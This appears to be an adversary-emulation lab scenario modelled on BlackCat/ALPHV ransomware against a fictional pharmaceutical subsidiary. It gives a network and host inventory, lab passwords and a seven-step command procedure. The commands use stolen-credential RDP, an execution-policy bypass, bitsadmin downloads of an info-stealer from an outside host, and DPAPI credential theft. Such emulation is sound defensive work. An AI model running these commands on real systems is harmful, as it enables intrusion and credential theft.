# Control Scenario: BlackCat/ALPHV

## 1.1 Attack Chain Overview (7 Steps)

| Step | Name                                          | ATT&CK Tactic(s)                                      | Key Activities                                                                                                          |
| ---- | --------------------------------------------- | ----------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| 0    | Operator Setup                                | Resource Development                                  | Establish WebDAV server (rclone) for exfiltration, start file server for tool staging (InfoStealer, ExMatter, BlackCat) |
| 1    | Initial Compromise and Discovery              | Initial Access, Discovery                             | RDP via compromised contractor credentials, ADRecon.ps1 for AD/network discovery                                        |
| 2    | Credential Access                             | Credential Access, Defense Evasion                    | InfoStealer against SQL databases, disable AV/EDR via multiple methods                                                  |
| 3    | Credential Access for Privilege Escalation    | Credential Access, Privilege Escalation, Exfiltration | Enable WDigest, LSASS dump via Task Manager, exfiltrate via rclone                                                      |
| 4    | Collection & Exfiltration                     | Discovery, Collection, Exfiltration                   | Network scanning, ExMatter deployment via PsExec for data exfiltration                                                  |
| 5    | Payload Deployment                            | Lateral Movement, Execution, Impact                   | BlackCat Linux ransomware deployment to KVM server via SCP/SSH, VM encryption                                           |
| 6    | Encryption for Impact/Inhibit System Recovery | Execution, Impact, Defense Evasion                    | BlackCat Windows ransomware execution, propagation via PsExec, file encryption, event log clearing                      |

## 2. Target Environment Specification

### 2.1 Overview

The ALPHV BlackCat scenario emulates an attack against a subsidiary of a global pharmaceutical company. The environment consists of:

- **Contractor Network** (external trusted partner with VPN/RDP access)
- **Corporate Subsidiary Network** with multiple segments:
  - User/Workstation segment
  - Server segment (backup infrastructure, domain controllers)
  - Virtualization segment (Linux KVM server hosting VMs)

**Attack Path Summary:**

1. Initial access via compromised contractor credentials -> RDP to bastion host
2. Lateral movement through corporate network using harvested credentials
3. Data exfiltration via ExMatter to external SFTP server
4. Ransomware deployment to Linux KVM server (VM encryption) and Windows hosts

### 2.2 Network Architecture

#### 2.2.1 Network Segments

| Segment                   | CIDR          | Purpose                               |
| ------------------------- | ------------- | ------------------------------------- |
| **Subsidiary - Servers**  | 10.20.10.0/24 | Domain controllers, file/SQL/Exchange |
| **Subsidiary - Desktops** | 10.20.20.0/24 | User workstations                     |
| **Contractor Network**    | 10.30.0.0/16  | Standalone contractor workstation     |

### 2.3 Host Inventory

#### 2.3.1 Host Summary Table

| Hostname      | IP Address   | OS                  | Role                 |
| ------------- | ------------ | ------------------- | -------------------- |
| raremon       | 10.30.10.4   | Windows 11          | Contractor WS        |
| kimeramon     | 10.20.20.11  | Windows 11          | Bastion Workstation  |
| datamon       | 10.20.10.122 | Windows Server 2022 | SQL Server           |
| blacknoirmon  | 10.20.10.4   | Windows Server 2022 | Domain Controller    |
| stormfrontmon | 10.20.10.200 | Windows Server 2022 | Exchange Server      |
| alphamon      | 10.20.10.23  | Windows Server 2022 | File Server          |
| butchermon    | 10.20.20.22  | Windows 11          | Workstation          |
| bakemon       | 10.20.20.33  | Windows 11          | Workstation          |
| leomon        | 10.20.10.16  | Ubuntu 22.04 LTS    | KVM Server           |
| kraken        | 176.59.1.18  | Kali Linux 2023.4   | Attack Platform      |
| homelander    | 116.83.1.29  | Linux               | Verification Jumpbox |

### 2.4 Accounts & Credentials

#### 2.4.1 Domain Accounts

| Account            | Domain      | Type         | Group Memberships                  | Password (Lab Only) |
| ------------------ | ----------- | ------------ | ---------------------------------- | ------------------- |
| zorimoto           | DIGIREVENGE | Domain User  | Domain Users, Remote Desktop Users | tzTVgs44isT4YxWU!   |
| ykaida.da          | DIGIREVENGE | Domain Admin | Domain Admins                      | FWy9aXyXbYrbxFcE!   |
| evals_domain_admin | DIGIREVENGE | Domain Admin | Domain Admins                      | axi9eengei9inaeR@   |

#### 2.4.2 Local Accounts

| Account | Host(s)       | Type                | Password (Lab Only) | Scenario Use                     |
| ------- | ------------- | ------------------- | ------------------- | -------------------------------- |
| windesk | Windows hosts | Local Administrator | windesk             | Disable AV, privilege escalation |

#### 2.4.3 Service/Application Accounts

| Account     | Application      | Type                | Password (Lab Only)                                    | Scenario Use                              |
| ----------- | ---------------- | ------------------- | ------------------------------------------------------ | ----------------------------------------- |
| netbnmadmin | NetBNMBackup SQL | SQL Service Account | [Retrieved via InfoStealer not specified in procedure] | Backup server access                      |
| marakawa    | Linux KVM (sudo) | Linux Admin         | cuL9LmnrdnWqbqcA@                                      | SSH access to KVM server, ransomware exec |

## Section 3: Attack Chain Procedure

"procedure": {
    "action_sequence": [
      {
        "step_id": 1,
        "original_step_id": null,
        "tactic": "Initial Access",
        "technique_id": "T1133",
        "technique_name": "External Remote Services",
        "os": "Windows",
        "host": "kimeramon",
        "command": "mstsc /v:10.20.20.11",
        "description": "RDP from the contractor workstation to the corporate bastion host using the stolen contractor credentials.",
        "execution_level": "non-elevated"
      },
       {
        "step_id": 2,
        "original_step_id": null,
        "tactic": "Command and Control",
        "technique_id": "T1105",
        "technique_name": "Ingress Tool Transfer",
        "os": "Windows",
        "host": "kimeramon",
        "command": "bitsadmin /transfer adrecon /download https://raw.githubusercontent.com/sense-of-security/ADRecon/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1 %USERPROFILE%\\Downloads\\ADRecon.ps1",
        "description": "Download the ADRecon PowerShell script to the bastion host for AD enumeration.",
        "execution_level": "non-elevated"
      },
      {
        "step_id": 3,
        "original_step_id": null,
        "tactic": "Discovery",
        "technique_id": "T1087.002",
        "technique_name": "Account Discovery: Domain Account",
        "os": "Windows",
        "host": "kimeramon",
        "command": "powershell -ExecutionPolicy Bypass -Scope CurrentUser -File \"%USERPROFILE%\\Downloads\\ADRecon.ps1\" -Collect GroupMembers,Computers -OutputType CSV",
        "description": "Execute ADRecon to enumerate domain groups, privileged accounts, and domain\u2011joined computers.",
        "execution_level": "non-elevated"
      },
      {
        "step_id": 4,
        "original_step_id": null,
        "tactic": "Command and Control",
        "technique_id": "T1105",
        "technique_name": "Ingress Tool Transfer",
        "os": "Windows",
        "host": "kimeramon",
        "command": "bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
        "description": "Download the InfoStealer tool to the SQL host using BITS.",
        "execution_level": "non-elevated"
      },
      {
        "step_id": 5,
        "original_step_id": null,
        "tactic": "Lateral Movement",
        "technique_id": "T1021.001",
        "technique_name": "Remote Services: Desktop Protocol",
        "os": "Windows",
        "host": "Bastion",
        "command": "mstsc /v:10.20.10.122 ",
        "description": "RDP from the bastion host to the datamon Server host to harvest additional credentials.",
        "execution_level": "elevated"
      },
      {
        "step_id": 6,
        "original_step_id": null,
        "tactic": "Command and Control",
        "technique_id": "T1105",
        "technique_name": "Ingress Tool Transfer",
        "os": "Windows",
        "host": "datamon",
        "command": "bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
        "description": "Download InfoStealer onto the datamon Server host.",
        "execution_level": "non-elevated"
      },
      {
        "step_id": 7,
        "original_step_id": null,
        "tactic": "Credential Access",
        "technique_id": "T1555",
        "technique_name": "Credentials from Password Stores",
        "os": "Windows",
        "host": "datamon",
        "command": "%TEMP%\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
        "description": "Execute InfoStealer against the SQL Server host using harvested credentials",
        "execution_level": "non-elevated"
      }
    ]
  }
